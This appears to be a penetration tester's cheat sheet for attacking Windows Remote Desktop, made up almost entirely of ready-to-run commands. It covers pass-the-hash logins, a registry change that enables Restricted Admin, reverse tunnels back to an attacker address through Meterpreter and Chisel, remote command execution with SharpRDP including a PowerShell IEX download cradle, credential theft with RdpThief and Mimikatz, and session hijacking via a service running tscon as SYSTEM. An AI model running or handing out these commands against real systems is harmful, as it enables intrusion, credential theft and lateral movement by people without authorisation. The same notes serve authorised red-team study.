---
tags:
  - Foundational
  - Lateral_Movement
  - RDP
  - Windows
---

## RDP Attacks
resources: [MITRE - Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001/)

> [!info] RDP allows full GUI access. Good for pivoting, credential theft, and maintaining presence.

### Standard RDP Connection [Local]
```bash
xfreerdp /u:<User> /p:<Password> /v:<Target>
```

```bash
rdesktop -u <User> -p <Password> <Target>
```

### RDP with Pass-the-Hash [Local]
> [!warning] Requires Restricted Admin mode enabled on target.

```bash
xfreerdp /u:<User> /pth:<NTHash> /v:<Target>
```

### Enable Restricted Admin (Target) [Remote]
```cmd
reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f
```

### Check RDP Access [Local]
```bash
nxc rdp <Target> -u <User> -p <Password>
nxc rdp <Target> -u <User> -H <NTHash>
```

## Reverse RDP Proxying with Metasploit

### Setup Reverse Port Forward
```text
meterpreter> portfwd add -R -p 3389 -l 3389 -L 127.0.0.1
```

### Connect to Forwarded RDP [Local]
```bash
xfreerdp /u:<User> /p:<Password> /v:127.0.0.1
```

## Reverse RDP Proxying with Chisel

### Chisel Server [Local]
```bash
chisel server --reverse --port 8080
```

### Chisel Client (Target) [Remote]
```cmd
chisel.exe client <AttackerIP>:8080 R:3389:<TargetIP>:3389
```

### Connect via Tunnel [Local]
```bash
xfreerdp /u:<User> /p:<Password> /v:127.0.0.1:3389
```

## RDP as Console

### SharpRDP - Execute Commands via RDP [Remote]
```cmd
SharpRDP.exe computername=<Target> command="cmd.exe /c whoami" username=<User> password=<Password>
```

### SharpRDP with Pass-the-Hash [Remote]
```cmd
SharpRDP.exe computername=<Target> command="powershell -c IEX(...)" username=<User> ntlmhash=<NTHash>
```

## Stealing Credentials from RDP

### RDP Credential Hooking
> [!tip] Hook RDP client to capture credentials when admin connects.

### RdpThief (Inject into mstsc.exe) [Remote]
```cmd
RdpThief.exe
```

### Mimikatz RDP Credential Dump [Remote]
```cmd
mimikatz.exe
ts::mstsc
```

### RDP Session Hijacking [Remote]
> [!danger] Requires SYSTEM. Hijack disconnected sessions without credentials.

```cmd
query user
```

```cmd
tscon <SessionID> /dest:console
```

### Get SYSTEM for Hijacking [Remote]
```cmd
sc create sesshijack binpath="cmd.exe /k tscon <SessionID> /dest:console"
net start sesshijack
```

## Multi-hop RDP

### Tunnel RDP Through Existing RDP [Local]
> [!tip] RDP to first host, then RDP to internal host from there.

```bash
xfreerdp /u:<User1> /p:<Password1> /v:<Target1>
```

```cmd
mstsc.exe /v:<Target2>
```
